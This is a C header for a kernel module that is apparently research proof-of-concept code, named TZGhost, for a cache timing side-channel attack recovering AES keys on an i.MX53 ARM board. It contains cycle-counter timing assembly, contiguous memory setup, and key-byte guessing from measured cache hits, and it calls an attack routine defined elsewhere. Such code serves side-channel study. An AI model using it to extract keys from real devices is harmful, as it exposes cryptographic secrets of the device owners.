#ifndef TZ_GHOST
#define TZ_GHOST

#include "TZGhostConstant.h"
#include "AesTeTable.h"

unsigned int setHitCount[64];

struct CacheTopology
{
	unsigned int numOfCacheLv;
	unsigned int numOfL1Set;
	unsigned int numOfL2Set;
	unsigned int numOfL1Way;
	unsigned int numOfL2Way;
	unsigned int L1LineSize;
	unsigned int L2LineSize;
};

void * vp = 0;
unsigned int * channelMeasure = 0;

struct CacheTopology topo;

void setIMX53CacheTopology()
{
	topo.numOfCacheLv = 2;
	topo.numOfL1Set = 128;
	topo.numOfL2Set = 512;
	topo.numOfL1Way = 4;
	topo.numOfL2Way = 8;
	topo.L1LineSize = 64;
	topo.L2LineSize = 64;
}

void allocateContinuousMemory()
{
	// allocate 2 MB memory
	vp = (void*) __get_free_pages(GFP_KERNEL, 9);
	channelMeasure = (unsigned int*) __get_free_pages(GFP_KERNEL, 9);
	memset(vp,				0x0  ,0x200000);
	memset(channelMeasure,	0x0  ,0x200000);

}

void freeContinuousMemory()
{
	// free the pages
	free_pages(vp, 9);
	free_pages(channelMeasure,9);
}



u32 getIndex(u8 keyByteOffset,u8 keyVal)
{
	return 256*keyByteOffset+keyVal;
}


u8 findMax(u8 keyByteLocation)
{
	u32 currentMaxCount = 0;
	u8 byteVal = 0;

	int i = 0;
	for(i=0;i<256;i++)
	{
		if(channelMeasure[getIndex(keyByteLocation,i)] > currentMaxCount)
		{
			currentMaxCount = channelMeasure[getIndex(keyByteLocation,i)];
			byteVal = i;
		}
	}
	return byteVal;
}

u8 printKeyGuessed(unsigned char* trueKey)
{
	int print_key_guessed_detail = 0;

	u8 correctKeyByteGuessed = 0;
	int i = 0;
	unsigned char correctKey[16];
			if(print_key_guessed_detail > 0)  printk("\nthe guessed key is\n");
	for(i = 0; i < 16; i++ )
	{
		unsigned char keyByteGuessed = findMax(i);
		if(print_key_guessed_detail > 0)  printk("%02x,",keyByteGuessed);
		if(keyByteGuessed == trueKey[i])
		{
			correctKey[i] = 1;
			correctKeyByteGuessed++;
		}
		else 
			correctKey[i] = 0;
	}
			if(print_key_guessed_detail > 0)  printk("\n");

			if(print_key_guessed_detail > 0)  printk("the real key is\n");
	for(i = 0; i < 16; i++ )
	{
				if(print_key_guessed_detail > 0)   printk("%02x,",trueKey[i]);
	}
			if(print_key_guessed_detail > 0)  printk("\n");

	for(i = 0; i < 16; i++ )
	{
				if(print_key_guessed_detail > 0)  printk("%d",correctKey[i]);
	}

	return correctKeyByteGuessed;
}

void dumpEntireTable()
{
	int i =0;
	int j = 0;

	for(i = 0; i < 16; i++)
	{
		printk("%u th byte of the key\n",i);
		for(j = 0; j < 256; j++)
		{
			printk("%u %u %u\n",i,j,channelMeasure[getIndex(i,j)]);
		}
	}
}


#include "TZGhostImplV2.h"

u8 attackIMX53(u32 encryptionsToSniff)
{
	return attackIMX53v2(encryptionsToSniff);
}




void getBasicTimingInfo(int option)
{
	allocateContinuousMemory();
	#define NUM_TRY 1000

	register int op_time = 0;
	register int index = 0;

	asm volatile(
			"ldr r0,=0xffffffff		\n\t"
			"mcr p15,0,r0,c9,c12,1 	\n\t"		// enable cycle counter
			"mcr p15,0,r0,c9,c12,3 	\n\t"		// clear overflow
			:
			:
			: "r0"
		);

	// need to make sure it is cachable, but it is by default anyways
	//correct_section_paging(vp);

	flushL1L2(2);

	//printk("time it took to perform the operation %lu \n", op_time);

	switch(option)
	{

		// loading from memory
		case 1:
		for(index = 0; index < NUM_TRY; index++)
		{
			asm volatile(
				"mcr p15,0,%1, c7,c14,1 \n\t"
				"isb					\n\t"
				"dsb					\n\t"
				"mrc p15,0,r0,c9,c12,0	\n\t"		// pmnc - read reg
				"orr r0,r0,#0x4			\n\t"		// sets the counter reset bit
				"mcr p15,0,r0,c9,c12,0	\n\t"		// pmnc - write reg
				"mrc p15,0,r1,c9,c13,0 	\n\t"		// reads the cycle counter
				"isb					\n\t"
				"dsb					\n\t"		// let's do this to be more accurate
				"ldr r0,[%1]			\n\t"
				"isb					\n\t"
				"dsb					\n\t"
				"mrc p15,0,r2,c9,c13,0 	\n\t"		// reads the cycle counter
				"subs r0,r2,r1			\n\t"
				//"adds %0,%0,r0			\n\t"		
				//"mov %0,r1				\n\t"
				//"add r1, %0, r0			\n\t"
				"mov %0, r0				\n\t"
				: "=r"(op_time)
				: "r"(vp),"0"(op_time)
				: "r0","r1","r2"
				);
				printk("%d\n", op_time);
		}
		break;

		// loading directly from cache
		case 2:
		for(index = 0; index < NUM_TRY+1; index++)
		{
			asm volatile(
				// "mcr p15,0,%1, c7,c14,1 \n\t"
				// "isb					\n\t"
				// "dsb					\n\t"
				"mrc p15,0,r0,c9,c12,0	\n\t"		// pmnc - read reg
				"orr r0,r0,#0x4			\n\t"		// sets the counter reset bit
					"mcr p15,0,r0,c9,c12,0	\n\t"		// pmnc - write reg
				"mrc p15,0,r1,c9,c13,0 	\n\t"		// reads the cycle counter
				"isb					\n\t"
				"dsb					\n\t"		// let's do this to be more accurate
				"ldr r0,[%1]			\n\t"
				"isb					\n\t"
				"dsb					\n\t"
				"mrc p15,0,r2,c9,c13,0 	\n\t"		// reads the cycle counter
				"subs r0,r2,r1			\n\t"
				//"adds %0,%0,r0			\n\t"		
				//"mov %0,r1				\n\t"
				//"add r1, %0, r0			\n\t"
				"mov %0, r0				\n\t"
				: "=r"(op_time)
				: "r"(vp),"0"(op_time)
				: "r0","r1","r2"
				);
				printk("%d\n", op_time);
		}
		break;

		// loading from 
		case 3:
		for(index = 0; index < NUM_TRY; index++)
		{
			asm volatile(
				"mcr p15,0,%1, c7,c14,1 \n\t"
				"str r0,[%1]			\n\t"		//place the data in L2
				"isb					\n\t"
				"dsb					\n\t"
				"mrc p15,0,r0,c9,c12,0	\n\t"		// pmnc - read reg
				"orr r0,r0,#0x4			\n\t"		// sets the counter reset bit
				"mcr p15,0,r0,c9,c12,0	\n\t"		// pmnc - write reg
				"mrc p15,0,r1,c9,c13,0 	\n\t"		// reads the cycle counter
				"isb					\n\t"
				"dsb					\n\t"		// let's do this to be more accurate
				"ldr r0,[%1]			\n\t"
				"isb					\n\t"
				"dsb					\n\t"
				"mrc p15,0,r2,c9,c13,0 	\n\t"		// reads the cycle counter
				"subs r0,r2,r1			\n\t"
				//"adds %0,%0,r0			\n\t"		
				//"mov %0,r1				\n\t"
				//"add r1, %0, r0			\n\t"
				"mov %0, r0				\n\t"
				: "=r"(op_time)
				: "r"(vp),"0"(op_time)
				: "r0","r1","r2"
				);
				printk("%d\n", op_time);
		}
		break;

	}

	freeContinuousMemory();


}





#endif

